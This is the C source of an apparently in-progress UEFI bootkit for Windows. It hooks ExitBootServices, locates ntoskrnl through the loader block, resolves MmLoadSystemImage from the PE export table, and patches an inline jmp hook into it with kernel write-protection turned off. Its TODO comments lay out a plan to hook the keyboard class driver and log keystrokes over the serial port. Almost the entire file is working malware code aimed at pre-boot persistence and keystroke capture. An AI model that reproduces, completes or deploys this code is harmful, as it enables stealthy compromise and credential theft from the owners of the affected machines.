/**
 * Author: adi arnon.
 * Purpose: Bootkit :)
 * Date: 18/4/2026
 */

/********************************************************
 * Include
 ********************************************************/
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Guid/EventGroup.h>
#include <IndustryStandard/PeImage.h>
#include <Library/IoLib.h>  
#include <Library/UefiRuntimeServicesTableLib.h>

#include "Hook.h"

/********************************************************
 * Globals
 ********************************************************/
EFI_EXIT_BOOT_SERVICES originalExitBootServices = NULL;
UINT64 winloadReturnAddress = 0;
VOID * kernelBase = 0;
UINT64 g_OriginalMmAddress = 0;

/********************************************************
 * Functions
 ********************************************************/
/**
 * TODO:
 * 1) Parse ntoskrnl PE to find any asset you want. (Write func for it)  done!
 * https://ferreirasc.github.io/PE-Export-Address-Table/
 * 
 * 2) Find MmLoadSystemImage hook it using r10. (inline asm, chat)
 * 
 * 3) Every time hook catch check PsLoadedModuleList -> Prase it. Find "kbdclass.sys".
 * https://gist.github.com/muturikaranja/b7d4b59c72611e76aed94b2f0bf33aa2
 * 
 * 4) Set hook on Kbdclass!KeyboardClassServiceCallBack -> msdn read
 * https://phrack.org/issues/69/15
 * https://learn.microsoft.com/en-us/previous-versions/ff542324(v=vs.85) -> MSDN!!!!!!!
 * 5) Print chars using SerialWrite.
 */

extern VOID HookEntry(void);
extern UINT8 StolenPrologue[];     // Label from ASM

VOID SerialWrite(CHAR8 *str)
{
    while (*str) {
        IoWrite8(COM1_PORT, *str++);
    }
}

VOID SerialWriteHex(UINT64 val)
{
    CHAR8 buf[16 + 3 + 2];
    CHAR8 hex[] = "0123456789ABCDEF";
    buf[0] = '0'; buf[1] = 'x';
    for (INT32 i = 17; i >= 2; i--) {
        buf[i] = hex[val & 0xF];
        val >>= 4;
    }
    buf[18] = '\n'; buf[19] = '\r'; buf[20] = 0;
    SerialWrite(buf);
}


VOID*
FindPattern(
    IN VOID   *Base,
    IN UINTN  Size,
    IN UINT8  *Pattern,
    IN UINTN  PatternSize
)
{
    UINT8 *Start = (UINT8*)Base;

    if (!Base || !Pattern || PatternSize == 0 || Size < PatternSize)
        return NULL;

    for (UINTN i = 0; i <= Size - PatternSize; i++)
    {
        if (CompareMem(Start + i, Pattern, PatternSize) == 0)
        {
            return (VOID*)(Start + i);
        }
    }

    return NULL;
}

VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
{
    SerialWrite("hello from FindNtosExportByName \n");
    EFI_IMAGE_DOS_HEADER* DosHeaders = (EFI_IMAGE_DOS_HEADER*)kernelBase;
    EFI_IMAGE_NT_HEADERS64* NtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeaders->e_lfanew);
    UINT32 exportDirRva = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRva == 0) {
        return NULL;
    }
    EFI_IMAGE_EXPORT_DIRECTORY* ExportDirReal = (EFI_IMAGE_EXPORT_DIRECTORY*)(exportDirRva + (UINT8*)kernelBase);
    UINT32* names = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNames);
    UINT32* functions = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfFunctions);
    UINT16* ordinals = (UINT16*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNameOrdinals);

    for (UINT32 i = 0; i < ExportDirReal->NumberOfNames; i++)
    {
        CHAR8* currentName = (CHAR8*)((UINT8*)kernelBase + names[i]);

        if (AsciiStrCmp(currentName, exportName) == 0)
        {
            //found!!!
            UINT32 FuncRVA = functions[ordinals[i]];
            VOID* finalAddress = (VOID*)((UINT8*)kernelBase + FuncRVA);
            SerialWrite("Found Export: ");
            SerialWrite(exportName);
            SerialWrite(" at: ");
            SerialWriteHex((UINT64)finalAddress);
            return finalAddress;
        }
    }

    SerialWrite("Export NOT found\n");
    return NULL;
}

EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
{
    if (!TargetFunction) return EFI_INVALID_PARAMETER;

    g_OriginalMmAddress = (UINT64)TargetFunction;
    UINT8* ptr = (UINT8*)TargetFunction;
    SerialWrite("Raw function bytes:\n");
    for (int i = 0; i < 24; i++) {

        SerialWriteHex(ptr[i]);

    }

    UINT8 HookPatch[13] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    VOID* RuntimeHookAddress = (VOID*)HookEntry; 

    gRT->ConvertPointer(0, &RuntimeHookAddress); 
    VOID* pOriginalAddr = (VOID*)&g_OriginalMmAddress;
    gRT->ConvertPointer(0, &pOriginalAddr);

    *(UINT64*)(HookPatch + 2) = (UINT64)RuntimeHookAddress;
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ULL);

    CopyMem(TargetFunction, HookPatch, 13);

    AsmWriteCr0(cr0);

    SerialWrite("Hook installed successfully with JMP r10\n");
    return EFI_SUCCESS;
}

VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
    SerialWrite("winloadVA: ");
    SerialWriteHex(winloadReturnAddress);

    // Sig LogOsLanchScanBase func
    UINT8 sig[] = {0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD};
     
    VOID * LogOsLanchScanBase = FindPattern((VOID*)winloadReturnAddress,0x10000,sig,sizeof(sig));

    if (LogOsLanchScanBase) {
        SerialWrite("LogOsLanchScanBase: ");
        SerialWriteHex(LogOsLanchScanBase);
    }
    PLOADER_PARAMETER_BLOCK loaderBlock = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(LogOsLanchScanBase + 0x10) + LogOsLanchScanBase + 0x14); 
    if (NULL == loaderBlock)
    {
        SerialWrite("FUCK loaderBlock\n");
    }
    KLDR_DATA_TABLE_ENTRY *kernelEntery =  CONTAINING_RECORD(loaderBlock->LoadOrderListHead.ForwardLink, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (kernelEntery) {
        SerialWrite("kernel base address: ");
        SerialWriteHex(kernelEntery->DllBase);
        SerialWrite("kernel dump: ");
        SerialWriteHex(*((UINT32*)(kernelEntery->DllBase)));
        VOID* mmLoadAddress = FindNtosExportByName(kernelEntery->DllBase, "MmLoadSystemImage");
        if (mmLoadAddress) {
            SerialWrite("MmLoadSystemImage found, installing hook...\n");
            InstallPureAsmHook(mmLoadAddress);        
        }
}

}

EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    // returnAddress is somewhere inside winload.efi!OslFwpKernelSetupPhase1
    winloadReturnAddress = (UINT64)__builtin_return_address(0);
    Print(L"OslFwpKernelSetupPhase1   -> (phys) 0x%p\n", winloadReturnAddress);

    // restore before calling
    gBS->ExitBootServices = originalExitBootServices;

    return originalExitBootServices(ImageHandle, MapKey);
}

VOID DebugCheckAddress(VOID* addr)
{
    EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
    UINTN MapSize = 0;
    UINTN MapKey;
    UINTN DescriptorSize;
    UINT32 DescriptorVersion;

    // שלב 1: קבלת גודל
    gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);

    // שלב 2: הקצאת buffer
    MapSize += 0x1000;
    if (EFI_ERROR(gBS->AllocatePool(EfiBootServicesData, MapSize, (VOID**)&MemoryMap))) {
        Print(L"AllocatePool failed\n");
        return;
    }

    // שלב 3: קבלת ה-map בפועל
    if (EFI_ERROR(gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion))) {
        Print(L"GetMemoryMap failed\n");
        return;
    }

    // שלב 4: חיפוש הכתובת
    EFI_MEMORY_DESCRIPTOR* desc = MemoryMap;

    for (UINTN i = 0; i < MapSize / DescriptorSize; i++) {
        UINT64 start = desc->PhysicalStart;
        UINT64 end   = start + desc->NumberOfPages * 4096;

        if ((UINT64)addr >= start && (UINT64)addr < end) {
            Print(L"\n[FOUND ADDRESS]\n");
            Print(L"Addr = %p\n", addr);
            Print(L"Type = %d\n", desc->Type);
            Print(L"Start = %lx End = %lx\n", start, end);
        }

        desc = (EFI_MEMORY_DESCRIPTOR*)((UINT8*)desc + DescriptorSize);
    }
}

EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS status;
    EFI_EVENT event;

    Print(L"\n\n\n");
    Print(L"================================================\n");
    Print(L"          BOOTKIT IS RUNNING                     \n");
    Print(L"          HookEntryPoint executed successfully!  \n");
    Print(L"================================================\n\n");

    gBS = SystemTable->BootServices;

    Print(L"[DEBUG] Checking HookEntry address...\n");
    DebugCheckAddress((VOID*)HookEntry);
    
    status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &event);

    if (EFI_ERROR(status)) {
        Print(L"[-] CreateEventEx(VirtualAddressChange) failed: %r\n", status);
        return status;
    }
    Print(L"[+] EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE registered\n");

    originalExitBootServices  = gBS->ExitBootServices;
    gBS->ExitBootServices     = HookedExitBootServices;
    Print(L"[+] HookedExitBootServices registered\n");


    return EFI_SUCCESS;
}